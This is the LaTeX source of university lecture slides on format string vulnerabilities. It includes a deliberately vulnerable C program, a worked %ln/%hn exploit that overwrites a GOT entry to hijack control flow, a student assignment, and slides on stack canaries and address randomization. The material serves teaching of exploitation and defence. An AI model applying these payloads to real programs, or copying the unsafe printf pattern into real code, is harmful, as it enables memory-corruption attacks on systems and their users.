        \node at (current page.center) {
            16 bytes of stack after return address
        };
    \end{visibleenv}
\end{tikzpicture}
\end{frame}

\begin{frame}{viewing the stack --- not so bad, right?}
    \begin{itemize}
    \item can read stack canaries!
    \item but actually \textbf{much} worse
    \item can write values!
    \end{itemize}
\end{frame}

\begin{frame}{printf manpage}
    \begin{itemize}
        \item For {\tt \%n}:
        \begin{itemize}
            \item The  number  of  characters  written so far is \myemph{stored into the integer pointed to by the
                corresponding argument}.  That argument shall be an {\tt int *}, or variant whose size  matches
              the  (optionally)  supplied  integer  length  modifier. 
        \end{itemize}
    \item<2> {\tt \%hn} --- expect {\tt short \*} instead of {\tt int *}
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=formatSetup]{format string exploit: setup}
\lstset{
    language=C,
    style=small,
}
\begin{lstlisting}
#include <stdlib.h>
#include <stdio.h>

int exploited() {
    printf("Got here!\n");
    exit(0);
}

int main(void) {
    char buffer[100];
    while (fgets(buffer, sizeof buffer, stdin)) {
        printf(buffer);
    }
}
\end{lstlisting}
\end{frame}

\begin{frame}[fragile,label=formatGOT]{format string overwrite: GOT}
\lstset{
    language={},
    style=smaller
}
\begin{lstlisting}
0000000000400580 <fgets@plt>:
  400580:       ff 25 9a 0a 20 00       jmpq   *0x200a9a(%rip)
        # 601038 <_GLOBAL_OFFSET_TABLE_+0x30>
`\textit{\ldots}`

0000000000400706 <exploited>:
...
\end{lstlisting}
    \begin{itemize}
        \item goal: replace \texttt{0x601030} (pointer to \texttt{fgets}) \\
              with \texttt{0x400726} (pointer to \texttt{exploited})
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=formatExample]{format string overwrite: setup}
\lstset{
    language=C,
    style=smaller,
}
\begin{lstlisting}
    /* advance through 5 registers, then
     * 5 * 8 = 40 bytes down stack, outputting
     * 4916157 + 9 characters before using 
     * %ln to store a long.
     */
    fputs("%c%c%c%c%c%c%c%c%c%.4196157u%ln", stdout);
    /* include 5 bytes of padding to make current location
     * in buffer match where on the stack printf will be reading.
     */
    fputs("?????", stdout);
    void *ptr = (void*) 0x601038;
    /* write pointer value, which will include \0s */
    fwrite(&ptr, 1, sizeof(ptr), stdout);
    fputs("\n", stdout);
\end{lstlisting}
\end{frame}

\begin{frame}{demo}
\end{frame}

\begin{frame}{demo}
    \begin{itemize}
        \item but millions of characters of junk output?
        \item can do better --- write value in multiple pieces
            \begin{itemize}
            \item use multiple \%n
            \end{itemize}
    \end{itemize}
\end{frame}
    
\tikzset{
    mylabel/.style={draw,red,ultra thick,inner sep=0.5mm,label={[red!70!black,fill=white]#1}}
}

\begin{frame}[fragile,label=exploitPattern]{format string exploit pattern (x86-64)}
    \begin{itemize}
        \item write {\tt 1000} (short) to address {\tt 0x1234567890ABCDEF}
        \item write {\tt 2000} (short) to address {\tt 0x1234567890ABCDF1}
        \item buffer starts 16 bytes above printf return address
    \end{itemize}
\begin{tikzpicture}
    \begin{scope}
    \tikzset{every node/.style={font=\tt\small,inner sep=0.1mm}}
    \node (skipRegs) {\%c\%c\%c\%c\%c};
    \node[right=0cm of skipRegs](skipStack) {\%c\%c\%c\%c};
    \node[right=0cm of skipStack] (chooseNumber) {\%.991u};
    \node[right=0cm of chooseNumber] (writeValue) {\%hn};
    \node[right=0cm of writeValue] (chooseNumber2) {\%.1000u};
    \node[right=0cm of chooseNumber2] (writeValue2) {\%hn};
    \node[right=0cm of writeValue2] (dots) {\ldots};

    \node[below=1cm of writeValue](pointer) {\verb|\x12\x34\x56\x78\x90\xAB\xCD\xEF|};
    \node[left=0cm of pointer] (dots2) {\ldots};
    \node[below=0cm of pointer](pointer2) {\verb|\x12\x34\x56\x78\x90\xAB\xCD\xF1|};
    \end{scope}

    \begin{visibleenv}<2>
        \node[fit=(skipRegs),mylabel={skip over registers}] {};
    \end{visibleenv}
    \begin{visibleenv}<3>
        \node[fit=(skipStack) (chooseNumber),mylabel={{skip to format string buffer, past format part}}] {};
    \end{visibleenv}
    \begin{visibleenv}<4>
        \node[fit={(chooseNumber)},mylabel={9 + 991 chars is 1000}] {};
    \end{visibleenv}
    \begin{visibleenv}<5>
        \node[fit={(writeValue)},mylabel={write to first pointer}] {};
    \end{visibleenv}
    \begin{visibleenv}<6>
        \node[fit={(chooseNumber2)},mylabel={1000 + 1000 = 2000}] {};
    \end{visibleenv}
    \begin{visibleenv}<7>
        \node[fit={(writeValue2)},mylabel={write to second pointer}] {};
    \end{visibleenv}
    % FIXME: annotate these
\end{tikzpicture}
\end{frame}


\begin{frame}{format string assignment}
    \begin{itemize}
        \item released Friday
        \item one week
        \item good global variable to target
            \begin{itemize}
                \item to keep it simple/consistently working
                \item more realistic: target GOT entry and use return oriented programming (later)
            \end{itemize}
    \end{itemize}
\end{frame}



% FIXME: integer overflow with array indices

% FIXME: integer overflow and undefined behavior

% FIXME: Integer overflow

% FIXME: making things reliable
    % information disclosure from use-after-free, etc.
    % ...

% FIXME: heap spraying

% FIXME: format string exploits

\begin{frame}{control hijacking generally}
    \begin{itemize}
    \item usually: need to know/guess program addresses
    \item usually: need to insert executable code
    \item usually: need to overwrite code addresses
    \vspace{.5cm}
    \item next topic: countermeasures against these
    \item later topic: defeating those
    \item later later topic: secure programming languages
    \end{itemize}
\end{frame}

\begin{frame}{control hijacking flexibility}
    \begin{itemize}
        \item lots of \myemph{generic} pointers \myemph{to code}
        \begin{itemize}
            \item vtables, GOT entries, function pointers, return addresses
            \item pretty much any large program
        \end{itemize}
    \item \myemph{data pointer overwrites} become code pointer overwrites
        \begin{itemize}
            \item overwrite data pointer to point to code pointer
            \item data pointers are everywhere!
        \end{itemize}
    \item type confusion from use-after-free is pointer overwrite
        \begin{itemize}
            \item bounds-checking won't solve all problems
        \end{itemize}
    \end{itemize}
\end{frame}

% FIXME: split slides around here?

\begin{frame}{first mitigation: stack canaries}
    \begin{itemize}
    \item saw: stack canaries
    \item tries to stop:
        \begin{itemize}
        \item \myemph{overwriting code addresses} \\
             (as long it's return addresses)
        \end{itemize}
    \item by assuming:
        \begin{itemize}
        \item compile-in protection
        \item attacker can't read off the stack
        \item attacker can't ``skip'' parts of the stack
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}{second mitigation: address space randomization}
    \begin{itemize}
    \item problem for the stack smashing assignment
    \item tries to stop:
        \begin{itemize}
        \item \myemph{know/guess programming addresses} \\
        \end{itemize}
    \item by assuming:
        \begin{itemize}
        \item program doesn't ``leak'' addresses
        \item relevant addresses can be changed (not hard-coded in program)
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}{thinking about the threat}
    \begin{itemize}
        \item contiguous versus arbitrary writes?
            \begin{itemize}
            \item just protect next to target?
            \item just protect next to buffer?
            \end{itemize}
        \item information disclosure or not?
    \end{itemize}
\end{frame}

\begin{frame}{convincing developers}
    \begin{itemize}
        \item legacy code?
        \item manual effort?
        \item performance overhead?
        \item memory overhead?
    \end{itemize}
\end{frame}

\begin{frame}{ideas for mitigations}
\end{frame}

\begin{frame}{next time}
    \begin{itemize}
    \item comparing mitigations
        \begin{itemize}
        \item what do they assume the attacker can do?
        \item effect on performance?
        \item recompilation? rewriting code?
        \end{itemize}
    \end{itemize}
\end{frame}
